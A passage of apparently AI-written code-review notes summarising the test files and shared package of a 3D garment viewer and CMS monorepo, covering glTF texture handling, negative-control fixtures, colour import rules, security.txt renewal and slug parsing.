- `compare.test.ts` — "The contact sheet is what the artwork decision gets made from, so its numbers have to be trustworthy in both directions." Zero for identical, exact meanDelta/maxDelta for a known shift (20 > DIFF_THRESHOLD → changedFraction 1); ⚠️ views present on only one side are REPORTED "rather than dropping them — a short sheet is easy to mistake for a clean result; a half-failed render run must not look like agreement."
- `ink-contrast.test.ts` — "THE NEGATIVE CONTROL THE PLAN ASKS FOR (Group 4)": one print at factor == cloth and one at white — "the flag must fire on exactly one." Stencil fixture = near-white (rgb 245) opaque ink; fabric = plain opaque picture; fixtures use linear `baseColorFactor` because glTF stores factors in linear light.
- `attribute-bytes.test.ts` — ⚠️ "THE MOST IMPORTANT TEST IN THIS FILE IS `plausible`": the first version reported 208 MB of indices inside a 16.56 MB file (summed per accessor where many share one bufferView); "Nothing flagged it; it was caught only because the number was physically impossible. Every assertion about 'what a garment is made of' is worthless without that check, so it is pinned here in both directions." Shared-bufferView counted once (800 not 1,600); TEXCOORD_0+1 merged ("the question is 'how much of this garment is UVs'"); reads the meshopt extension's byteLength (on disk) not the outer one (decompressed) — "Reading the outer figure would overstate every garment in the catalogue, since production ships meshopt."
- `material-class.test.ts` — Names verbatim from the 28 raw exports: 8 hardware (incl. `люверсы_4410` — "CLO passes through the designer's own language"), 11 fabric (incl. `Textile_Cotton` — "MUST be fabric — ARTWORK_NAME would call this artwork"), 6 unclassified (incl. empty and `Material.001`). Token boundary: `Buttonhole_Reinforcement_3` is not a button, `Cottontail_Motif_9` is not cotton. ⚠️ Ambiguity reported, never ordered: "`Zipper 1_TapeFabric_*` is real, and it is the woven tape … even though 'Zipper' leads the name. An earlier draft said 'hardware wins ties', which would have forced that tape to stay metallic… the same rule the owner set for Trim_* on 2026-08-26." CamelCase glue seen.
- `precision.test.ts` — Grid read from a file the REAL quantizer produced, not from arithmetic about one: 1.6 m at 14 bits ≈ 0.0977 mm (asserted 0.09–0.11); scales inversely with size (4× ratio); unquantized = no grid; `describePrecision` warns exactly under `MIN_GAP_STEPS` 2 and has explicit null-gap wording.
- `posters.test.ts` — Naming: slugifies the way the CMS does; `parseColourMap` refuses malformed pairs with messages naming the format. ⚠️ Transparency measured on the pixels "not assumed from an option — a harness that quietly painted its grey behind the garment would pass every other check and ship a grey slab into the viewer's stage." Top-edge alpha checked across the WHOLE edge, not two pixels: "the defect those two corners caught on 2026-09-08 was a BAND… alpha 102 for 5 rows; the two corner samples happened to sit inside it."
- `variant-colour.test.ts` — Fixtures modelled on N001: 5 variants, 44 materials each split 18/14/6/4 — "The colour a buyer means is the dominant one; the zips and the printed logo are not the garment's colour and must never be sampled." Quads have testable AREA weighting; UV span distinguishes print (span 1) from cloth (tiles); factors set in linear light.
- `ktx2-colour-space.test.ts` — "THE KTX2 FILES SAY WHICH COLOUR SPACE THEY ARE IN" — read from the BYTES the encoder wrote (Dfd byte 48 + transfer-function byte: 2 sRGB / 1 linear per KDF 1.3 §5), "not from the option passed… Until 2026-09-03 no pass set the flag, so colour and data maps were stamped alike — the 2026-08-21 KTX2 refusal ('the white bib panel came out grey and blotchy') had the transfer function as its variable, not the codec." Asserts sRGB in colour maps, linear in normal/MR maps.
- `instruments.browser.test.ts` — "THE INSTRUMENTS, DRIVEN IN A REAL BROWSER — audit HR-7": until now every test checked TEXT ("the page source contained `Object.defineProperty(camera, 'near'`) — "A future model-viewer that renamed one internal symbol would leave every one of those tests green while the page quietly stopped doing any of it." Reads internals back in Chromium: near plane must be the adaptive value, biased material must report polygonOffset. Negative control = the OLD page with instruments off. ⚠️ SKIPS loudly without Chromium because CI's verify job has no browser; the artwork job runs it inside the Playwright container — "a skipped browser test is not a passed one." Fixture carries both bias mechanisms (MASK → alphaTest; depthBias extras → userData).
- `overlay-annotate.test.ts` — Minimal hand-built GLB: "this unit patches the JSON chunk and copies the BIN chunk, and never looks at geometry — so a real garment would test nothing extra here while hiding what did change. The garments are covered by the sweep the measurements in overlay-depth.test.ts come from." Scene = two colourways of one printed panel plus the fabric behind — exercises the variant-mapping path.
- `placeholders.test.ts` — "The seeded garment must be able to SHOW damage": until 2026-09-03 six prints stacked 0.5 mm apart on the chest ("destroying any of the five behind the front one changed no render") and fabric carried no picture at all ("half of every shipped preset acted on nothing"). Asserts: every print has a placement and no two within 10 cm; front/back/left/right all covered "so a camera on any side sees a print"; every quad wound outward (cross·normal > 0).
- `raw-census.test.ts` — "Every measurement is checked against a document built to exhibit it, and every warning is checked BOTH WAYS — present on the file that earns it, absent on the file that does not — so a line that never fires cannot pass for one that watches." Piece helper draws quads at chosen mesh name × UV span so name-vs-geometry disagreements are fixture-able.
- `render.test.ts` — Pins harness configuration, not rendering (that needs a browser and belongs to `eval:artwork`). ⚠️ THE INCIDENT (2026-08-08): `min-field-of-view` defaults 12°, four renders at 1.4/2/3.1/4.5° came back BYTE-IDENTICAL — "a perfectly plausible frame of the wrong thing"; CANONICAL.json fingerprints `fieldOfView` "is the zoom control" only above the floor, and CLAUDE.md's "NOT COVERED" prints "could not be framed tightly enough to measure at all, so prints smaller than roughly a hand were unguardable by construction rather than by choice. Removing this attribute silently restores all of that." Also pins `disable-zoom` (unrelated to fieldOfView — "a distinction worth pinning, because 'zoom is disabled' reads like a reason to delete the attribute above") and the progress-bar suppression (2026-09-08, alpha-102 band; "Height and colour are both asserted because either alone is enough to keep the frame clean").
- `repair-dead-textures.test.ts` — ⚠️ "THE REFERENCE IS THE WHOLE POINT": an unreferenced source-less texture never reaches `setTypeInfo` and reads fine, "so a fixture that merely appended a dead entry would pass against completely unfixed code." ⚠️ A first attempt used an empty sampler and "dies later on `setWrapS` instead — a fixture that breaks the reader, but not the way the real files break it, so the assertion pinning the real message passed against the wrong failure"; sampler 0 is verbatim from ARISAN (9729/9987 — "all six exports match"). Fixture rebuilds the whole container because JSON grows; the repair itself never rebuilds — "it pads the shortened JSON back to its original length precisely so the BIN chunk cannot move."
- `review-server.test.ts` — Imports BOTH viewer libs by relative path and asserts the server's copies equal them (near plane, decal bias, hard max) — "one source" enforced by test. A directory that cannot be read is skipped, not fatal — "This is what saved the CLI when `review <dir> --port 4180` passed '4180' as a second directory." Teardown uses `handle.close()` "not server.close(): the latter waits for keep-alive sockets that Node's own fetch never closes, and hangs."
- `strip-live-metadata.test.ts` — Hand-built GLB, BIN payload "deliberately NOT valid geometry — nothing here decodes it, and that is the point: this module must copy those bytes without looking at them." Fixture carries root MetaData + material `depthBias` + primitive `uvRemap` extras; asserts root extras gone, file shrunk, and ⚠️ "THE ASSERTION THE WHOLE MODULE EXISTS TO EARN" — BIN byte-for-byte identical (these files are meshopt-compressed; re-encode would silently lose artwork protection).
- `strip-root-extras.test.ts` — Fixture carries root `MetaData` AND material-level `depthBias` "because the whole risk of this transform is taking the second while removing the first." Leak strings asserted on the SERIALISED root, "because the point is that none of these strings can still be read out of the shipped file" (`Stretch-Warp`, `SeamLinePairList`, `D:/New File`, fabric name). ⚠️ "THE ASSERTION THIS FILE EXISTS FOR": leaves MATERIAL and PRIMITIVE extras completely alone — the audit's first prescription, `prune({ keepExtras: false })`, "does not remove root extras at all AND starts disposing properties that survive on theirs… `extras.depthBias` is read in the browser via three.js `material.userData`; losing it returns the decal z-fighting with no error anywhere."
- `texture-fold.test.ts` — "THE FIXTURE THE PLAN ASKS FOR (Group 9)": near-constant map folded, real weave not — both built pixel-by-pixel against the measured numbers (skinsuit roughness G 213–221 stdev 0.80 / B 0–3 stdev 0.48 vs a weave with stdev ~50); also flat/tilted normals and a solid colour; `PHONE_GPU_BUDGET_BYTES` and `CONSTANT_TEXTURE_MAX_STDEV` imported so thresholds cannot silently change without the fixture noticing.
- `textures.test.ts` — "These build the fixture the shipped placeholders cannot: a garment with a printed graphic on a SECOND UV set, over a BLEND material, with a hard alpha cutout. That combination is what the first real CLO export turned out to contain, and every placeholder in this repo is four untextured boxes — which is precisely why nothing caught the damage before it reached production." Fixture set: plain fabric (no alpha channel), binary decal, fully-opaque alpha (CLO's stray opacity), graded alpha (genuine translucency); asserts `profileAlpha` classes, `offUv0Warning`/`summariseUvSets`, and `CRUSHED_BYTES_PER_PIXEL`.
- `topstitch.test.ts` — Non-linear-UV welded grid (same rationale as simplify-textured: "a linear fixture cannot show the difference between 'reduced' and 'left alone'"); mesh is NAMED so the stitch pattern selects it; runs the real `MeshoptSimplifier`; ratio/error passed explicitly so the 0.0005 default is exercised directly.
- `uv-remap.test.ts` — Arithmetic of the remap: composed `KHR_texture_transform` round trip, `applyTextureTransform`/`composeTextureTransform` pure helpers, `uvSpanInPatternSpace`, `UV_QUANTIZE_BITS`; fixtures can carry CLO-style existing transforms so composition (not replacement) is what's tested.
- `uv-remap.browser.test.ts` — "THE REMAP, RENDERED — BOTH WAYS": unit tests prove the arithmetic; this proves "three.js in a real browser applies `KHR_texture_transform` the way the spec's shader does, per map, after our composition" — and first that compare can SEE a wrong UV: checkerboard tiled four times; with composed remap the render must match, with coordinates moved and materials left alone (negative control) it "must differ wildly. A harness that reported 'identical' for both would be measuring nothing (2026-08-29)." ⚠️ Skips loudly without Chromium.
- `validate.test.ts` (29 lines, read whole) — The ONLY test: `SIZE_WARNING_BYTES` equals the shared copy. Why a second copy exists and why the import is RELATIVE into shared's source ("works in the monorepo where tests run, never reached inside the container image where tests do not"). What drift would cost: "`validate` would call a file publish-ready that the CMS then rejects on upload, or stay silent about one that is over the mobile guideline."
- `viewer-page.test.ts` — Pins what makes one source safe to share (HR-2/HR-3): no backtick in `instrumentsScript()`; constants carried BY VALUE so the page cannot drift; near plane installed as a GETTER with `value.isObject3D` ("the trap that costs a debugging session") and bias re-applied per colourway; failures NAMED via `window.__instruments` (`nearPlaneSkipped`, "NEAR PLANE NOT INSTALLED" — "The bias already reported UNREACHABLE on screen; the near plane failed silently"); lighting triples per mode.
- `gltf-validator.d.ts` (55 lines, read whole) — Local module declaration: severity as 0|1|2|3, issues matched on `code` ("Stable identifier… Match on this, never the prose"), `truncated` noted as "a count without its messages", `ignoredIssues` pointing at `SPEC_NOISE` in gltf-spec.ts, `externalResourceFunction` — "A GLB should never need it."
- `draco3dgltf.d.ts` (7 lines, read whole) — Minimal default-export shim (`createDecoderModule`/`createEncoderModule` → `Promise<unknown>`).

**Item 17 sweep summary (74/74 read):** Riskiest sources: `optimize.ts` (the whole chain; two past defects — the absent-vs-present option contract and the missing `rootExtras` at the boundary), `variant-texcoord.ts` (latent but the exact "variant-only materials skipped" shape that has shipped twice), `uv-remap.ts` (touches every UV set; composition must be exact). Tests' dominant pattern: **measured fixtures with negative controls** — overlay-depth's seven real-GLB readings, alpha-coverage's coarse-fixture admission, repair's "reference is the whole point", gltf-spec's undeclared-WebP control, strategy's "design document said drop it — measured wrong". Recurring repo-wide lessons re-echoed here: (1) a fixture that cannot exhibit the defect passes against broken code; (2) text-matching tests on page source go green when the page stops working (HR-7 → browser tests); (3) variant-only/eager material asymmetry (three separate modules guard it); (4) "if production looks like that, seed that" (span 120 fabric, sampler verbatim, hand-built describe GLB). No fixture-shaped-unable-to-fail tests found; the two drift-pin tests (validate, review-server) are the sanctioned workaround for the container's plain-npm constraint.

## 18. packages/shared/src/ (20 files, ALL READ 2026-09-22)

- `company.ts` — The one postal address for both surfaces (moved out of `structuredData.ts` when the 3D pages' footers needed it; apps may not import each other per biome `noRestrictedImports`, so it lives in the package both depend on). `formatAddress()` derives from `POSTAL_ADDRESS`; the test pins "built from the constant, not typed twice".
- `company.test.ts` — Pins the exact one-line address and that it derives from the constant (drift guard between the two footers).
- `contact.ts` — Locked B2B/OEM enquiry template (deliberately no retail wording): subject, body, `mailto:` and `wa.me` builders; `normalizeWhatsAppNumber` strips to wa.me digits.
- `contact.test.ts` — Pins template lines in order + URL encoding; asserts American spelling across always-sent copy (owner decision 2026-09-04) via `findBritishSpellings(...) === []` imported from `scripts/copy-rules.mjs` — the spell rule reaches into a shared test rather than duplicating the word list.
- `defaults.ts` — `DEFAULT_SITE_SETTINGS`: single source used when the CMS global is empty (publicViewer) or the API unreachable (viewer UnavailableState). ⚠️ Comment says "keep in sync with the SiteSettings global's field defaults" — a manual two-copy sync, the exact drift shape this package exists to prevent elsewhere; no test ties the two together.
- `documentVisits.ts` — Pakistan-time days/weeks + the one visit summary shared by the Monday email (`infra/apex-404` imports by relative path) and the CMS admin box (via `@run-apparel/shared`); owner decisions D26/D33, 2026-09-15: two copies of "read past halfway" would drift and the owner would read one figure in the email and another in the admin for the same week. ⚠️ Pakistan time, never UTC (a UTC date files 00:00–04:59 Pakistan visits under the previous day). ⚠️ Nothing runs at import — the viewer imports the barrel, so the `Intl` formatter builds lazily. Date parts read by TYPE, not by trusting `en-CA`'s CLDR pattern (Node's ICU in tests, workerd's in production decide the string rows join on). Sort is code-unit order, not `localeCompare` (each runtime ships its own collation). Unknown document row skipped, not a crash (rows reach the Worker from D1 untyped). "People" = people-days (codes change daily; admin says "about").
- `documentVisits.test.ts` — Boundaries asserted at 19:00 UTC (midnight Pakistan) rather than a comfortable midday; week cases around the Monday 09:00 PK cron; a NEGATIVE CONTROL relabels a person as robot and shows the counts move; an unknown-document row is proven not to perturb the summary.
- `importColours.ts` — Four never-do rules, each with its own test: never rewrite an existing `slug` (printed on physical QR tags, cannot be recalled — collisions get `-2`, `-3` suffixes); never reorder rows (the first switched-on row is the default colourway → reorder repoints printed tags at a different garment); never switch anything on (every imported row arrives `active: false`); never guess (low-confidence match gets an empty name + measured swatch — "a confident wrong name is exactly how 'Navy' came to be printed on a maroon garment"). Moved from `apps/cms/src/fields` 2026-08-10 so the shrink robot's `colourImport.ts` shares the rules instead of re-implementing; the Docker container never imports it (plain npm, no `workspace:*`) which is why it may live here.
- `importColours.test.ts` — The N001 five-in-file/three-mapped fixture that motivated the module; pins append-only, off-by-default, slug stepping (`forest-green-4`), low-confidence → blank name but kept swatch. Header restates that the shrink robot reuses `buildImportedRow` "rather than re-implementing it for exactly this reason".
- `index.ts` — Barrel re-exporting 11 modules; because the viewer imports it, every module here must be import-time inert.
- `media.ts` — `SIZE_WARNING_BYTES` 8 MB (QR visitors are mobile-first) and `GLB_HARD_MAX_BYTES` 40 MB (above it a file is almost certainly a raw CLO export — the kind behind the 66 MB live incident; block and point at the pipeline). Lives here because the shrink Worker must know the ceiling BEFORE POSTing to `/api/media`; previously it did not and an over-size result surfaced as an opaque Payload 400 with no hint which knob to turn. `formatMb` shared so both sides of the queue phrase errors identically.
- `securityTxt.ts` — ONE security.txt (RFC 9116) served by documents Worker + CMS + viewer across 7 canonical hosts, decided 2026-09-18. Why one source: internet.nl recommended it on all six audited hosts; three copies would drift the day one is renewed — a stale `Expires` is exactly what RFC 9116 §2.5.5 exists to catch. Renewal choreography: change two constants, deploy; `scripts/public-security-probe.mjs` reads every host's live copy daily and fails 30 days before expiry so nobody has to remember. ⚠️ Canonical list omits `www.` on purpose (308 to the apex copy; internet.nl follows redirects — verified in their `checks/tasks/securitytxt.py`, 2026-09-18). `securityTxtProblems()` is the same evaluator for the unit test and the live probe.
- `securityTxt.test.ts` — Deliberately never compares against today's date (a calendar-failing test would redden every unrelated PR — expiry is watched by the daily probe); pins Expires ≤ 1 year after Reviewed; one entry per required line; six negative controls each fault, plus a 31-days-fine control.
- `shrink.test.ts` (test of section 9's file) — Pins `--meshopt` never `--draco` (comment carries the 2026-08-21 production failure: the viewer resolves the draco decoder to www.gstatic.com, the CSP blocks it, the garment renders nothing — reclaim draco only after live `dracoDecoderLocation === '/draco/'` on cold load); stitch tightness ≤ 0.001 (a 20× looser 0.01 frayed the cord); data cap = exactly half the colour cap; error budget strictly increasing across levels; uv-weight never increasing AND never below balanced — ⚠️ this assertion "used to require uv weight to fall strictly across all three levels, which baked in the very bug it was meant to prevent" (old `small` shipped at half of balanced's protection; fixed to a floor, referencing the measured table in `simplify-textured.test.ts`); no offered level looser than balanced (the `small` removal, 2026-08-05); and the ONE absolute assertion in the file — balanced's error budget pinned to 0.001 because relative assertions cannot pin a value (0.005 would satisfy them all while destroying the wordmark): "changing this number means producing a new rendered crop, not editing this line". `autoDetailFor`: only-ever-upgrades (stored default indistinguishable from untouched), unknown/0/NaN/negative size = too big (fail safe), boundary measured against Minecut 45.59 MB → fidelity, AUTO_FIDELITY_MAX_RAW_BYTES ±1.
- `slugs.ts` — Slug pattern + `normalizeSlug`; `parseViewerPath` distinguishes "no colour requested" (product-only path → default colourway, NOT the retired-colourway notice — before this, `/n001` rendered "reference unavailable" for a published product, which is what a tag printed with only the product code actually produces) from a mangled colour segment (hard null — a broken link, not an unspecified one).
- `slugs.test.ts` — Pins both readings with the history comment; sloppy-QR normalization (`/N001/Navy`); rejects `/`, three segments, `/!!!`.
- `types.ts` — The public viewer API contract: only published, public-safe data crosses (no drafts, CMS users, internal notes, source files). `poster` nullable since 2026-08-21 (only remaining consumer is the OG preview card, which falls back). `customisationIntroHtml` sourced from the `build-process` global since 2026-08-17 — ⚠️ name and shape unchanged ON PURPOSE so the viewer consumes it exactly as before; the switch lives entirely inside `projectViewer.ts`. ⚠️ `VIEWER_ANALYTICS_EVENTS`: adding a name here is the WHOLE integration — `endpoints/events.ts` builds `KNOWN_ANALYTICS` from it and drops unknown events silently at ingest (no error, no row, no second place that would tell you if you forgot); the `web_vitals` entry carries that warning in-file.
- `variants.ts` — Product code pattern allows hyphens since 2026-08-17 (owner hit the refusal typing "RX-PS"); the hyphen is a SEPARATOR — leading/trailing/doubled stay invalid. The ambiguity of `${productCode}-${COLOUR}` (`RX-PS`+`NAVY` vs `RX`+`PS-NAVY`) is stated as structurally safe: IDs are only validated against a code already in hand or composed from one; grep-verified nothing splits an ID on `-`; `variants.test.ts` pins that pair. Lowercase invalid here by design (Products.ts uppercases in beforeValidate; mixed case would collide on the unique index while looking different). `buildVariantId` split-and-replaces rather than collapse-then-trim: CodeQL js/polynomial-redos — and honest that measured 2026-08-19 it was unreachable twice over (V8: 200k hyphens in 0.1 ms; collapse guarantees no adjacent hyphens) — "removes a flagged pattern; it does not close a live hole, and no timing test could ever have failed to prove otherwise".
- `variants.test.ts` — Pins hyphen-as-separator accepts/rejects; the ambiguity asserted rather than avoided (written the other way first — that's how it earned a test); sloppy slug → valid ID round trip for a fixed slug set.
- `shrink.ts` — Read as section 9.

**Item 18 sweep summary:** Riskiest: `types.ts` (silent analytics-drop contract — the only place an event name exists), `defaults.ts` (manual sync with SiteSettings, no test tying them), `documentVisits.ts` (two runtimes' ICU must agree — well-tested at the boundary). Cross-cutting: this package is the sanctioned answer to "two copies would drift" — six of eleven modules moved here for exactly that reason (address, size ceilings, colour-import rules, visit summary, security.txt, contact template). Every module must be import-time inert because the viewer imports the barrel. No fixture-shaped-unable-to-fail tests found; `shrink.test.ts` is this package's model of pinning an absolute value next to relative invariants. Item 18 COMPLETE (20/20).","oldString":"- `nextDetailAdvice`: no smaller level to send owner to — old one reached that size by damaging printed artwork = the product; honest lever is the export (re-export from CLO at lower mesh density). Saying so plainly beats a suggestion trading visible failure for invisible one.","path":"/private/var/folders/jv/kwg83d_x5g9fdv2d6h1_qkc40000gn/T/opencode/deep-read-notes.md"}","oldString":"- Result counters: artworkResized = real stroke-detail loss on wordmark → reported NOT blocked (trade owner should see, not discover); standardResized/dataResized recorded since 2026-09-03 (Rank 13, HE-05) so artwork eval can prove `--max-texture`/`--data-max-texture` ACTED not merely passed; routine so not in owner report.","path":"/private/var/folders/jv/kwg83d_x5g9fdv2d6h1_qkc40000gn/T/opencode/deep-read-notes.md"}
